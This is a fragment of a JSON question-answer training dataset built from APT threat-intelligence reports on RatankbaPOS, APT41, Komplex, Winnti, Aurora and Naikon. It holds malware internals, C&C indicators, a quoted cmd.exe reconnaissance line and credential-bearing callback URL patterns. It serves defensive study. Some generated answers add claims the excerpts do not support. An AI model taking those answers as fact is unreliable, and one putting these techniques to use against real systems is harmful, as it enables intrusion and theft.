evolve in their latest attack against Ukraine, and what were the consequences of this evolution?",
    "output": "The TeleBots group evolved from using spearphishing emails with malicious macros to employing a more sophisticated scheme known as a supply-chain attack. This involved targeting software supply chains to distribute their malware. Initially, the group focused on the financial sector, but their latest attack was directed against various businesses in Ukraine. The malware's spreading capabilities were underestimated, leading to it going out of control and affecting a broader range of targets than intended.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Shopping Spree: Enter RatankbaPOS\nBeyond (<http://www.bbc.com/news/world-asia-42378638>)stealing millions of US dollars worth of cryptocurrency, we have discovered a Lazarus operation to steal point-of-sale (POS) data primarily targeting POS terminals of businesses operating in South Korea. Considering the time of year, most retail businesses around the world report their highest volume of sales between November and December so naturally POS is a popular target for criminals. Enter RatankbaPOS, possibly the first publicly documented nation-state sponsored campaign to steal POS data from a POS-related framework.1\nAt this time we have been unable to determine how RatankbaPOS is being delivered; however, based on its sharing of C&C with PowerRatankba implants we hypothesize that Lazarus operators infiltrated at least one organization's networks utilizing PowerRatankba to deploy later stage implants (including the possibility of RFC18 Gh0ST RAT) to ultimately deploy RatankbaPOS. Based on the fact that the file was hosted on the C&C in plaintext, and not Base64 encoded, we assess that RatankbaPOS was more likely deployed with a later stage implant other than PowerRatankba.\nMedium Headline: RatankbaPOS Analysis\nRatankbaPOS is deployed through a process injection dropper that is also capable of installing itself persistently, checking a C&C for either an update or a command to delete itself, dropping the RatankbaPOS implant to disk, and finally searching for the targeted POS process and module for injection and ultimately the theft of POS data.\nThe dropper first sets up persistence by creating a registry key in HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\ CurrentVersion\\Run\\igfxgpttray. It uses its own module file name for the registry key value. Next, it makes an HTTP request to a hardcoded URL hxxp://www[.]webkingston[.]com/update.jsp?action=need_update using a hardcoded User-Agent (UA) of \"Nimo Software HTTP Retriever 1.0\" (Fig. 41) to request either instruction from the C&C to delete itself and remove the persistence registry key or to download an updated implant with which to replace itself. If no response is returned from the C&C, RatankbaPOS will begin the process injection search.\n1  We acknowledge the excellent work from (<https://twitter.com/ashley_shen_920>)@ashley_shen_920, (<https://twitter.com/051R15>)@051R15, and (<https://twitter.com/kjkwak12>)@kjkwak12 with their documentation of North Korean-related attacks on (<https://www.blackhat.com/docs/eu-17/materials/eu-17-Shen-Nation-State Moneymules-Hunting-Season-APT-Attacks-Targeting-Financial-Institutions.pdf>)VANXATM which was targeting ATM devices and not directly POS.\nThe process injection search begins by taking a snapshot of the process list using CreateToolhelp32Snapshot. The implant dropper/injector will then case-insensitive search for a process named xplatform.exe which we assess is likely associated with Tobesoft's (<http://www.nexacro.com/product/Xplatform.do>)XPLATFORM UI/UX design software. If a process name match is found then a TH32CS_SNAPMODULE CreateToolhelp32Snapshot call is used to make a snapshot of xplatform.exe's running module list. Loaded modules are then iterated using Module32First and Module32Next while converting each result to lowercase by adding 0x20 to any uppercase letters and then finally comparing the string to ksnetadsl.dll (Fig. 42) that we assess is associated with a (<https://www.crunchbase.com/organization/ksnet>)KSNET POS framework . Finally, the filesize of ksnetadsl.dll is checked to make sure it is 98,304 bytes (Fig. 42). If a successful match is found then the process ID (PID) of xplatform.exe is returned. Lastly, RatankbaPOS will be written to disk as c:\\windows\\temp\\hkp.dll and the PID of xplatform.exe process will be used to inject hkp.dll into xplatform.exe using LoadLibraryA and CreateRemoteThread (Fig. 43).\nRatankbaPOS will first hook the KSNETADSL.dll module at offset 0xB146 (Fig. 44). Interestingly there is code for RatankbaPOS to check KSNETADSL.dll for an exported function named 1000B146, which seems like an unusual export name for which to check, but this code will never be used because '!strcmp(\"1000B146\", \"1000B146\")' will always be true. We hypothesize that this feature was included either by mistake or was previously used for debugging. RatankbaPOS will also log messages to a file stored in c:\\windows\\temp\\log.tmp.\nAt this point in the reverse engineering process, we would naturally begin reversing the KSNETADSL. dll module; however, we have only been able to find two such modules with a filesize of 98,304 bytes:\n\u2022 f2f6b4770718eed349fb7c77429938ac1deae7dd6bcc141ee6f5af9f4501a695\n\u2022 6c8c801bb71b2cd90a2c1595092358e46cbfe63e62ef6994345d6969993ea2d6\nAfter analyzing both KSNETADSL.dll modules, our preliminary assessment is that neither of the modules are the correct target for RatankbaPOS. We can at least gain some insight into the purpose of KSNETADSL.dll, which appears to be the handling of encrypted and decrypted credit card numbers for a KSNET-related POS framework system (Fig. 45). Further analysis of RatankbaPOS focusing on the code used for C&C revealed the likely purpose of this implant\nOur analysis of the C&C communication revealed a number of clues as to what was being exfiltrated. Initially, the implant uses strchr to find the first occurrence of \"=\" in the string data that is received from the hook of KSNETADSL.dll. Next, 37-bytes beginning at 16-bytes before the position of the \"=\" are copied to a buffer. Finally, that buffer is compared to a substitution buffer that was created at the beginning of RatankbaPOS' execution (Fig. 47). The substitution algorithm uses the values starting at offset 0x30-0x39 in the \"E\"-filled buffer to substitute the ASCII values of \"0-9\" for \"ZCKOADBLNX\" as well as at offset 0x3D for substitution of ASCII \"=\" to \"Y\". Therefore, values \"0-9\" will be obfuscated to \"ZCKOADBLNX\" while \"=\" will be obfuscated to \"Y\" (Fig. 48).\nTo obfuscate the data, RatankbaPOS simply uses the hex value of the cleartext ASCII string to substitute itself for a value in the substitution buffer. For instance, a value of \"0\" would be substituted to \"Z\" while any equals signs (\"=\") will be substituted for \"Y\". This method is used to likely obfuscate the data so it is harder to detect by simply glancing at network traffic or through the use of heuristic-based detection of plaintext credit card data transmitted over the network. Once the stolen data has been obfuscated, it is sent in a POST HTTP request to the URL /list.jsp?action=up using the same hardcoded UA as the injector: \"Nimo Software HTTP Retriever 1.0\" (Fig. 49). So far we have observed the following C&C domains: www.energydonate[.]com and online-help.serveftp[.]com.\nBased on documentation we have found (<http://www.wisepos.net/common/down.jsp?clips=softcamp_setup_guide_20101123.doc>)online, RatankbaPOS is possibly targeting plaintext track data in the first 16 bytes followed by a \"=\" and finally followed by encrypted POS-related data beginning with \"99\" (Fig. 50). According to the document, this is an encrypted form of the track data. Based on this, there is the possibility that this campaign may be targeting a SoftCamp POS-related software application, framework, or device. If we are correct and the values \"99\" always follow the \"=\" sign then one could potentially find exfiltrated data in network traffic by searching for the string \"YXX\" starting at offset 16 in the client body of an HTTP POST request. However, more logic will likely be necessary to reduce false positives but this opens up several options for detection.\nFigure 50: Documentation on South Korean POS software depicting POS data that matches the pattern RatankbaPOS is searching for (markings not ours)\n\nQ: Explain the obfuscation technique used by RatankbaPOS to hide the exfiltrated data. What specific substitutions are made, and how does this method help in evading detection?",
    "output": "A: RatankbaPOS uses an obfuscation technique to hide the exfiltrated data. It uses a substitution buffer to replace ASCII values of '0-9' with 'ZCKOADBLNX' and '=' with 'Y'. For example, a value of '0' is substituted with 'Z', and any equals signs ('=') are substituted with 'Y'. This method helps in evading detection by making it harder to identify plaintext credit card data transmitted over the network. By obfuscating the data, it becomes less obvious to casual inspection and heuristic-based detection mechanisms, thereby increasing the chances of the exfiltrated data going unnoticed.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Outlook and Implications\nAPT41 is a dual threat demonstrating creativity and aggressiveness in carrying out both espionage campaigns and financially motivated operations. The group's capabilities and targeting have both widened over time, signaling the potential for additional supply chain compromises affecting more victims in additional verticals.\nAPT41's links to both underground marketplaces and state-sponsored activity may indicate the group enjoys protections that enables it to conduct its own for-profit activities, or authorities are willing to overlook them. It is also possible that APT41 has simply evaded scrutiny from Chinese authorities. Regardless, these operations underscore a blurred line between state power and crime that lies at the heart of threat ecosystems and is exemplified by APT41.\nMedium Headline: TECHNICAL ANNEX\nAttack Lifecycle\nInitial Compromise\nAPT41 leverages a variety of techniques to perform an initial compromise, including spear-phishing, moving laterally from trusted third parties, leveraging stolen credentials, using the CHINACHOP web shell, and accessing victim organizations using remote desktop sharing software, such as TeamViewer. APT41 often relies on the use of simple spear-phishing email with attachments such as compiled HTML (.chm) files to initially compromise their victims. However, once in a victim organization, the operation can leverage more sophisticated TTPs and deploy additional malware tools.\n\u2022 In a campaign running almost one year, APT41 compromised hundreds of systems and used close to 150 unique pieces of malware including backdoors, credential stealers, keyloggers, and rootkits.\n\u2022 We have observed TeamViewer credentials used as an entry point in multiple intrusions across industries. In these instances, APT41 leveraged TeamViewer to transfer malware into the compromised environment, although we do not have direct evidence of APT41 compromising TeamViewer.\n\u2013 In July 2017, APT41 initiated a TeamViewer session and transferred files that were later deleted. Filenames and creation times indicate that these may have been the HIGHNOON backdoor.\n\u2013 In May 2018, APT41 used TeamViewer for initial entry in the compromise of a healthcare company. During this intrusion, APT41 started a TeamViewer session and shortly after transferred DLL files associated with the CROSSWALK backdoor to the victim environment before deploying CROSSWALK.\nThe group has leveraged several exploits in their operations. Notably, APT41 was observed using proof-of-concept exploit code for CVE-2019-3396 within 23 days after the Confluence vulnerability was announced.\nObserved Vulnerabilities\n\u2022 CVE-2012-0158\n\u2022 CVE-2015-1641\n\u2022 CVE-2017-0199\n\u2022 CVE-2017-11882\n\u2022 CVE-2019-3396\nAPT41 compromised one organization and moved to a client environment.\nEstablish Foothold\nAPT41 uses a variety of malware and tools, both public and unique to the group, to establish a foothold with a victim's environment, including:\n\u2022 ASPXSpy\n\u2022 ACEHASH\n\u2022 Beacon\n\u2022 CHINACHOP\n\u2022 COLDJAVA\n\u2022 CRACKSHOT\n\u2022 CROSSWALK\n\u2022 DEADEYE\n\u2022 DOWNTIME\n\u2022 EASYNIGHT\n\u2022 Gh0st\n\u2022 HIGHNOON.LITE\n\u2022 HIGHNOON.PASTEBOY\n\u2022 HOTCHAI\n\u2022 HKDOOR\n\u2022 JUMPALL\n\u2022 LATELUNCH\n\u2022 LIFEBOAT\n\u2022 LOWKEY\n\u2022 njRAT\n\u2022 POISONPLUG\n\u2022 POISONPLUG.SHADOW\n\u2022 POTROAST\n\u2022 SAGEHIRE\n\u2022 SOGU\n\u2022 SWEETCANDLE\n\u2022 TERA\n\u2022 TIDYELF\n\u2022 XDOOR\n\u2022 WINTERLOVE\n\u2022 ZXSHELL\nAPT41 has been observed using Linux and Windows variants of the same malware families, such as PHOTO and HIGHNOON. The group often initially installs its backdoors to c:\\ windows\\temp.\nWe have observed APT41 attempting to masquerade their files and domains as popular anti-virus software:\n\u2022 \u2022 APT41 appears to use the commercially available Beacon backdoor that is part of the Cobalt Strike pen-testing software platform. In at least one instance, a server used for Beacon C&C was also leveraged for CROSSWALK C&C.\nOn multiple occasions, APT41 leveraged the Sticky Keys vulnerability and PowerShell to deploy malware families in victims' environments.\nEscalate Privileges\nAPT41 escalates its privileges in systems by leveraging custom-made and publicly available tools to gather credentials and dump password hashes. The tools include:\n\u2022 ACEHASH\n\u2022 GEARSHIFT\n\u2022 GOODLUCK\n\u2022 Mimikatz\n\u2022 NTDSDump\n\u2022 PHOTO\n\u2022 PwDump\n\u2022 WINTERLOVE\nWindows Credential Editor (WCE)\nAPT41 frequently uses the Windows Credential Editor to dump password hashes from memory and authenticate other user accounts.\nInternal Reconnaissance\nAPT41 conducts network reconnaissance after using compromised credentials to log on to other systems. The group leverages built-in Windows commands, such as \"netstat\" and \"net share,\" in addition to the custom and non-public malware families SOGU, HIGHNOON, and WIDETONE.\n\u2022 HIGHNOON includes the ability to collect host information by enumerating active Remote Desktop Protocol (RDP) sessions.\n\u2022 SOGU is capable of listing TCP and UDP network connections, respectively.\n\u2022 WIDETONE is capable of conducting port scans and password brute-force attacks and collecting network information. It contains an embedded variant of a publicly available enumeration tool and can be run with the following options:\n\u2013 \"-hbs\" option runs a port scan on the specified subnet.\n\u2013 \"-hscan\" scans the specified IP range for IPC and SQL services.\n\u2013 \"-enum\" queries a Windows host for requested information, such as users, groups/ members, policies, and more.\ncmd.exe /c whoami > C:\\wmi.dll 2>&1 cmd.exe /c del C:\\wmi.dll /F > nul 2>&1 cmd.exe /c a.bat > C:\\wmi.dll 2>&1\nMaintain Presence\nTo maintain presence, APT41 relies on backdoors, a Sticky Keys vulnerability, scheduled tasks, bootkits, rootkits, registry modifications, and creating or modifying startup files. APT41 has also been observed modifying firewall rules to enable file and printer sharing to allow for inbound Server Message Block (SMB) traffic.\n\u2022 APT41 leveraged ROCKBOOT as a persistence mechanism for PHOTO and TERA backdoors. The bootkit performs raw disk operations to bypass the typical MBR boot sequence and execute the backdoors prior to the host operating system. This technique was implemented to ensure the malware would execute at system runtime and was designed to be difficult to detect and prevent. APT41 ROCKBOOT samples have been signed with legitimate code-signing certificates from MGame and Neowiz, two South Korean video game companies.\n\u2022 APT41 leveraged ADORE.XSEC, a Linux backdoor launched by the Adore-NG rootkit, throughout an organization's Linux environment. The group installed the backdoor and the Adore-NG rootkit persistently by creating a hidden shell script in \"/etc/rc.d/init.d,\" a directory that contains the startup scripts for many system services. The Adore-NG rootkit is used to hide the backdoor and authenticate any incoming connections using a provided password.\n\u2022 The group also uses CROSSWALK.BIN, FRONTWHEEL, HIGHNOON.BIN, HIGHNOON. LINUX, HOMEUNIX, and PACMAN to maintain presence.\nIn some instances, APT41 leveraged POISONPLUG as a first-stage backdoor to deploy the HIGHNOON backdoor in the targeted environment. We observed APT41 use PowerSploit with the capability to use WMI as a persistence mechanism. The group also deploys the SOGU and CROSSWALK malware families as means to maintain presence.\nAPT41 has demonstrated it is highly agile, responding quickly to changes in victim environments and incident responder activity.\n\u2022 Hours after a victimized organization made changes to thwart APT41, the group registered a new C&C domain, compiled a new SOGU backdoor variant, and deployed the new backdoor to several systems across multiple geographic regions.\n\u2022 APT41 sent spear-phishing emails to multiple HR employees three days after the compromise had been remediated and systems were brought back online. Within hours of a user opening the malicious attachment dropping a HOMEUNIX backdoor, APT41 regained a foothold within the environment by installing PHOTO on the organization's servers across multiple geographic regions.\nAvoiding C&C Detection\nAt times APT41 uses legitimate websites, such as GitHub, Pastebin, and Microsoft TechNet, to avoid detection. Interestingly, some of the group's POISONPLUG malware samples leverage the Steam Community website associated with Valve, a video game developer and publisher. This technique of storing encoded or encrypted strings, known as dead drop resolvers (DDR), on legitimate websites that can subvert network defenders as traffic to and from the sites is typically benign.\nThe group has also configured Linux backdoors to run on ports used by legitimate applications within victim environments, enabling malicious traffic to bypass network security measures and hide malicious activity within the organization's regular application traffic.\nPreventing Anti-Virus Updates\nBefore attempting to deploy the publicly available Ransomware-as-a-Service (RaaS) Encryptor RaaS through group policy, APT41 blocked victim systems from retrieving anti-virus updates by accessing the DNS management console and implementing a forward lookup on the domain used for anti-virus updates to the park IP address \"1.1.1.1.\"\nComplete Mission\nAPT41 has been observed creating a RAR archive of targeted files for exfiltration. The group has also manipulated in-game currencies using the targets' databases after compromising production environments. During multiple engagements, APT41 attempted to remove evidence of some of its activity by deleting Bash histories, clearing Windows security and system events, and modifying DNS management to avoid anti-virus detections.\nIn at least one instance, the group attempted to deploy Encryptor RaaS. However, an operator's typo prevented the ransomware from executing in the victim's environment.\nIn another instance, APT41 deployed XMRig, a Monero cryptocurrency mining tool in a victim's environment.\nTECHNICAL ANNEX\nMITRE ATT&CK Mapping\nRead the text above and answer this question: How does APT41 maintain its presence within compromised environments, and what specific backdoors and techniques are employed for this purpose?",
    "output": "APT41 maintains its presence by relying on backdoors, a Sticky Keys vulnerability, scheduled tasks, bootkits, rootkits, registry modifications, and creating or modifying startup files. Specific backdoors and techniques include ROCKBOOT for PHOTO and TERA backdoors, ADORE.XSEC launched by the Adore-NG rootkit, CROSSWALK.BIN, FRONTWHEEL, HIGHNOON.BIN, HIGHNOON.LINUX, HOMEUNIX, and PACMAN. APT41 also uses POISONPLUG as a first-stage backdoor to deploy the HIGHNOON backdoor and PowerSploit with the capability to use WMI as a persistence mechanism.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Code Overlaps\nWhile reverse engineering the Komplex payload, we came across a few code overlaps that we believed were worth exploring. First, we noticed striking similarities between the Komplex payload and the traits and behavior of an OS X Trojan discussed in a BAE Systems blog titled (<http://baesystemsai.blogspot.com/2015/06/new-mac-os-malware-exploits-mackeeper.html>)NEW MAC OS MALWARE EXPLOITS MACKEEPER. According to this blog post, an OS X Trojan was delivered via a vulnerability in the MacKeeper application. The nameless OS X Trojan uses an 11-byte XOR algorithm to decrypt an embedded configuration, which has all of the same variable names and values as the Komplex sample (see Table 1). The algorithm used to encrypt and decrypt the network traffic, as well as all static elements of the network communications (composition of URL, structure of HTTP data, command parsing procedure, etc.) discussed in the blog post are the exact same as seen in the Komplex payload. These overlaps suggest that the Trojan delivered by the MacKeeper vulnerability was in fact the Komplex Trojan.\nSame URL generation logic using random path values, a random file extension and encrypted token\nSame file extensions used in C2 URL that are listed within the binaries in the same order\nSame algorithm used to encrypt and decrypt the token in the URL and HTTP POST data (Carberp key is modified using value 0xAA7D756 whereas Komplex uses 0xE150722)\nVery similar command handling, including parsing specifically for Execute, Delete, [file], [/file], FileName, and PathToSave.\nChecks for Internet connectivity by connecting to google.com\nUses an 11-byte XOR key to decrypt strings within the configuration\nIn addition to these common traits, we found a Sofacy Carberp variant (SHA256:\n638e7ca68643d4b01432f0ecaaa0495b805cc3cccc17a753b0fa511d94a22bdd) using the same TOKEN value of 'h8sn3vq6kl' within its C2 URL, as observed in Komplex payloads. Based on these observations, we believe that the author of Sofacy's Carberp variant used the same code, or at least the same design, to create the Komplex Trojan. A benefit of retaining many of the same functionalities within the Windows and OS X Trojans is that it would require fewer alterations to the C2 server application to handle cross-platform implants.\nMedium Headline: Infrastructure Overlap\nWhile Komplex's C2 domain appleupdate[.]org does not appear to have any previously known activity associated with it, both the apple-iclouds[.]net and itunes-helper[.]net domains have direct ties to Sofacy activity. The apple-iclouds[.]net domain is mentioned within a (<http://pwc.blogs.com/files/tactical-intelligence-bulletin---sofacy-phishing.pdf>)PwC Tactical Intelligence Bulletin that discussed a phishing campaign conducted by the Sofacy group. The itunes-helper[.]net domain is associated with separate activity discussed in Trend Micro's blog titled (<http://blog.trendmicro.com/trendlabs-security-intelligence/looking-into-a-cyber-attack-facilitator-in-the-netherlands/>)Looking Into a Cyber-Attack Facilitator in the Netherlands that included research on hosting providers used by Pawn Storm (Sofacy).\nThe domain appleupdate[.]org does have one interesting correlation point, specifically involving the IP 185.10.58[.]170 that resolved this domain between April 2015 through April 2016. Researchers at BAE Systems provided Unit 42 the Komplex payload delivered through the exploitation of MacKeeper (Dropper SHA256: da43d39c749c121e99bba00ce809ca63794df3f704e7ad4077094abde4cf2a73 and Payload SHA256: 45a93e4b9ae5bece0d53a3a9a83186b8975953344d4dfb340e9de0015a247c54), which used the IP address 185.10.58[.]170 within its configuration as a C2 server. This infrastructure overlap further strengthens the connection between the Komplex payload we discovered with the prior campaign using MacKeeper for delivery.\nBig Headline: Conclusion\nThe Sofacy group created the Komplex Trojan to use in attack campaigns targeting the OS X operating system \u2013 a move that showcases their continued evolution toward multi-platform attacks. The tool is capable of downloading additional files to the system, executing and deleting files, as well as directly interacting with the system shell. While detailed targeting information is not currently available, we believe Komplex has been used in attacks on individuals related to the aerospace industry, as well as attacks leveraging an exploit in MacKeeper to deliver the Trojan. The Komplex Trojan revealed a design similar to Sofacy's Carberp variant Trojan, which we believe may have been done in order to handle compromised Windows and OS X systems using the same C2 server application with relative ease.\nWhile Unit 42 continues to research and track this threat, Palo Alto Networks customers are protected via the following:\nWildFire correctly identifies known Komplex executables as malicious\nIPS signature #14442 Sofacy.Gen Command And Control Traffic can detect and block outbound C2 requests generated by the Komplex Trojan.\nCustomers can track this Trojan via the (<https://autofocus.paloaltonetworks.com/#/tag/Unit42.Komplex>)Komplex tag in AutoFocus.\n\nHow did the researchers determine that the Komplex Trojan was connected to the Sofacy group's previous activities, particularly those involving the Carberp variant?",
    "output": "Researchers determined the connection between the Komplex Trojan and the Sofacy group's previous activities by identifying several code overlaps and shared functionalities. Specifically, they found that the Komplex Trojan used the same 11-byte XOR algorithm for decrypting an embedded configuration, identical URL generation logic, and similar command handling procedures as described in a BAE Systems blog post about an unnamed OS X Trojan. Additionally, they discovered that a Sofacy Carberp variant used the same TOKEN value ('h8sn3vq6kl') within its C2 URL, suggesting that the author of Sofacy's Carberp variant used the same code or design to create the Komplex Trojan. This overlap indicates that the Komplex Trojan was likely developed to handle both Windows and OS X systems using the same C2 server application.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Key Judgements\n\u25cf We assess with high confidence that the Winnti umbrella is associated with the Chinese state intelligence apparatus, with at least some elements located in the Xicheng District of Beijing.\n\u25cf A number of Chinese state intelligence operations from 2009 to 2018 that were previously unconnected publicly are in fact linked to the Winnti umbrella.\n\u25cf We assess with high confidence that multiple publicly reported threat actors operate with some shared goals and resources as part of the Chinese state intelligence apparatus.\n\u25cf Initial attack targets are commonly software and gaming organizations in United States, Japan, South Korea, and China. Later stage high profile targets tend to be politically motivated or high value technology organizations.\n\u25cf The Winnti umbrella continues to operate highly successfully in 2018. Their tactics, techniques, and procedures (TTPs) remain consistent, though they experiment with new tooling and attack methodologies often.\n\u25cf Operational security mistakes during attacks have allowed us to acquire metrics on the success of some Winnti umbrella spear phishing campaigns and identify attacker location with high confidence.\n\u25cf The theft of code signing certificates is a primary objective of the Winnti umbrella's initial attacks, with potential secondary objectives based around financial gain.\nBig Headline: Report Summary\nThe purpose of this report is to make public previously unreported links that exist between a number of Chinese state intelligence operations. These operations and the groups that perform them are all linked to the Winnti umbrella and operate under the Chinese state intelligence apparatus. Contained in this report are details about previously unknown attacks against organizations and how these attacks are linked to the evolution of the Chinese intelligence apparatus over the past decade. Based on our findings, attacks against smaller organizations operate with the objective of finding and exfiltrating code signing certificates to sign malware for use in attacks against higher value targets. Our primary telemetry consists of months to years of full fidelity network traffic captures. This dataset allowed us to investigate active compromises at multiple organizations and run detections against the historical dataset, allowing us to perform a large amount of external infrastructure analysis.\nMedium Headline: Tactics, Techniques, and Procedures (TTPs):\nThough the TTPs of the attacking teams vary depending on the operation, their use of overlapping resources presents a common actor profile. Key interests during attacks often include the theft of code signing certificates, source code, and internal technology documentation. They also may attempt to manipulate virtual economies for financial gain. While unconfirmed, the financial secondary objective may be related to personal interests of the individuals behind the attacks.\nInitial attack methods include phishing to gain entry into target organization networks. The group then follows with custom malware or publicly available offensive tooling (Metasploit/Cobalt Strike), and may use a number of methods to minimize their risk of being detected. Such techniques include a particular focus on \"living off the land\" by using a victim's own software products, approved remote access systems, or system administration tools for spreading and maintaining unauthorized access to the network.\nWe have observed incidents where the attacker used other victim organizations as a proxy for unauthorized remote access. In these cases, organization 1 had been compromised for a long period of time, and the attacker accessed victim organization 2 via the organization 1 network.\nDelivery and C2 domains routinely have subdomains which resemble target organizations. Additionally, their C2 domains are used across many targets, while subdomains tend to be created and removed quickly and are unique to a particular target or campaign. Also noteworthy is that the actors set their domains to resolve to 127.0.0.1 when not in use, similar to what was originally reported on by Kaspersky Lab (see below).\nThe actor often uses TLS encryption for varying aspects of C2 and malware delivery. As noted in the \"Infrastructure Analysis\" section of this report, the actor primarily abuses Let's Encrypt to sign SSL certificates. We also observed many cases in which self-signed certificates were used in attacks.\nOverall, the Winnti umbrella and linked groups are lacking when it comes to operational security. However, some activities linked to these groups follow better operational security and infrastructure management approaches. This may be a clue to the division of responsibilities by team and skill level within the broader organization.\nMedium Headline: Targets:\nThe Winnti umbrella and linked groups' initial targets are gaming studios and high tech businesses. They primarily seek code signing certificates and software manipulation, with potential financially motivated secondary objectives. These targets have been identified in the United States, Japan, South Korea, and China.\nBased on the infrastructure, links to previous reporting, and recently observed attacks, the broader organization's main targets are political. Historically this has included Tibetan and Chinese journalists, Uyghur and Tibetan activists, the government of Thailand, and prominent international technology organizations.\nOne example of a politically focused lure by the Winnti umbrella and linked groups is an end of 2017 document titled \"Resolution 2375 (2017) Strengthening Sanctions on DPR of KOREA\" which is a malicious file associated with the C2 infrastructure described here - see MD5: 3b58e122d9e17121416b146daab4db9d.\nSmall Headline: 2013:\nKaspersky Lab publicly reported , technical details around the , and . Most noteworthy is the Winnti umbrella's targeting of gaming organizations in search of code signing certificates, virtual currencies, and updating mechanisms which could potentially be used to attack victims' clients. Interestingly, this was the first identified trojan for the 64-bit Microsoft Windows operating system with a valid digital signature as noted by the author. The abuse of signed applications is a very effective attack approach that the entity continues to use.\nSmall Headline: 2014:\nNovetta released an in which they collaborated with a number of private organizations on a large scale malware eradication operation which is linked to the original Winnti group by the malware being delivered. In the report, the actor is named Axiom. Novetta reported links to publications from as far back as 2009 that also link the group to the Chinese state intelligence apparatus with high confidence. Links exist to various known attacks and actor groups, such as \"Operation Aurora,\" Elderwood Group's successful 2010 attack against Google and many other organizations. Another link exists to the successful compromise of the security organization , where their own product was used to sign and spread malware to their customers. In addition, \" detailed attacks on Japanese targets from the same attack infrastructure. Many other incidents are detailed in the Operation SMN report. Following all of these details back in time, we can see an overlap in TTPs and\nSmall Headline: 2016:\nCylance reporting on digitally signed malware used in targeted attacks against gaming organizations in China, Taiwan, South Korea, Europe, Russia, and the United States. Cylance refers to the attacking entity as \"PassCV\" in their reporting. Cylance successfully identified a large quantity of malware binaries which were signed with valid certificates stolen from a number of gaming studios in East Asia. In addition to detailing the individual certificates and signed malware, they identified a significant amount of network infrastructure which contain various interesting links to our own findings.\nVery Small Headline: 2017 - July 5th:\non attacks against journalists by an actor mimicking China-focused news organizations HK01, Epoch Times, Mingjing News, and Bowen Press. As Citizen Lab noted, these news organizations are blocked in China for their political views. The report notes that malware used in these attacks was linked to a stolen code signing certificate mentioned in the Cylance PassCV post. That overlap, in addition to infrastructure links from , strongly links this attack to the previously mentioned reports as well as to our own. As Unit 42 reports, the attacks against entities in the government of Thailand used the \"bookworm\" trojan.\nBig Headline: Analysis of Attacks on Initial Targets\nThroughout 2017 and 2018, ProtectWise 401TRG was involved in a number of detection and incident response engagements with our customers that linked back to the Winnti umbrella and other closely associated entities. Through the analysis of public and private intelligence, we have successfully identified similar attacks, which allow us to assess with high confidence that the details below follow a global attack trend as the Chinese intelligence operations have evolved over time.\nAnswer this question: Why is the Winnti umbrella considered to be associated with the Chinese state intelligence apparatus? What evidence supports this assessment?",
    "output": "The Winnti umbrella is considered to be associated with the Chinese state intelligence apparatus due to several factors. Firstly, the attacker TTPs (tactics, techniques, and procedures) align with those used by Chinese state intelligence. Secondly, the observed attack infrastructure shows links to previously published intelligence on Chinese state operations. Lastly, operational security mistakes during attacks have revealed the true location of some attackers as the Xicheng District of Beijing, which is a strong indicator of state involvement.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: THREAT SUMMARY\nThe Aurora malware operation was identified recently and made public by Google and McAfeei. This malware operation has been associated with intellectual property theft including source code and technical diagrams (CAD, oil exploration bid+data, etc). Companies hit have been publically speculated, including Google, Adobe, Yahoo, Symantec, Juniper Systems, Rackspace, Northrop Grumman, ExxonMobil, ConocoPhillips, and Dow Chemical. The malware package used with Aurora is mature and been in development since at least 2006.\nThe Aurora operation is characterized by a remotely operated backdoor program that persists on a Windows computer. This backdoor program has several capabilities that are outline below.\n\nQuestion: How did the Aurora malware operation manage to persist on targeted systems, and what were some of its key capabilities?\n\nAnswer:",
    "output": "The Aurora malware operation managed to persist on targeted systems through the use of a remotely operated backdoor program designed to run on Windows computers. This backdoor program had several notable capabilities, including the ability to exfiltrate sensitive data such as source code and technical diagrams. The operation was sophisticated and had been in development since at least 2006, indicating a high level of maturity and sophistication. The malware was used to target various high-profile companies, including Google, Adobe, Yahoo, Symantec, Juniper Systems, Rackspace, Northrop Grumman, ExxonMobil, ConocoPhillips, and Dow Chemical, highlighting its effectiveness in intellectual property theft.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did the Desert Falcons APT group use spearphishing attachments to target their victims?",
    "output": "Phishing: Spearphishing Attachment is a tactic used by adversaries to gain access to victim systems by sending spearphishing emails with a malicious attachment. In the case of the Desert Falcons APT group, they used spearphishing attachments to target their victims, mainly government officials, media outlets, and activists in the Middle East. They would send emails with attachments that appeared to be legitimate documents, such as PDFs or Microsoft Office files, but actually contained malware. The emails were often crafted to appeal to the victim's interests or concerns, such as news related to political conflicts in their country. Once the victim opened the attachment, the malware would execute, allowing the attackers to gain access to the victim's system and steal sensitive information. The Desert Falcons also used social engineering techniques, such as posing as trusted sources, to increase the likelihood of the victim opening the attachment. Furthermore, they used various tactics to evade email boundary defenses, such as manipulating file extensions and icons to make the attachments appear legitimate.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: NAIKON AND MINOR LINKS WITH APT30\nAnother interesting aspect of the backdoor builder is that it also provides a keylogger plugin that is used on specific victim systems. And here there are minor, but striking, similarities with the APT30 tools.\nCallback sessions for stolen data include these URLs:\nPOST /stonehoof.rar/user=xxx&password=xxx\nGET /stonehoof.rar/user=xxx&password=xxx\nSome of the collector components upload data in SQLite3 format, while earlier versions of the tool upload xml formatted data. Presenting a similarity with the APT30 artifacts, their callback domains included stonehoof.com, hosted on several IPs during the naikon campaigns. This name is very unusual, and it is an odd coincidence that it is shared by two geopolitically-focused cyber-espionage groups, both targeting the South China Sea region.\nWhile the MsnMM components include the unusual \"MM\" in internal names sslMM, winMM, and wininetMM, some of the strings in the APT30 GEMSTONE software include the same \u2013 search and retrieval of the registry key \"Software\\Microsoft\\GetMM\", and three function names \"MicrosoftGMMExit, MicrosoftGMMHaveExit, MicrosoftGMMZJ\". The APT30 BACKSPACE backdoor also contains a similar potential target reference, as discussed in the FireEye paper.\nSo, the \"MM\" shared by both of these may be a simple reference to Myanmar, the starting target for these Naikon APT attacks.\nAPT30 backdoors also add \"MSN.lnk\" shortcuts to the Start Menu Startup location for persistence, just like the MsnMM components spoof \"Msn Gaming Zone.lnk\" 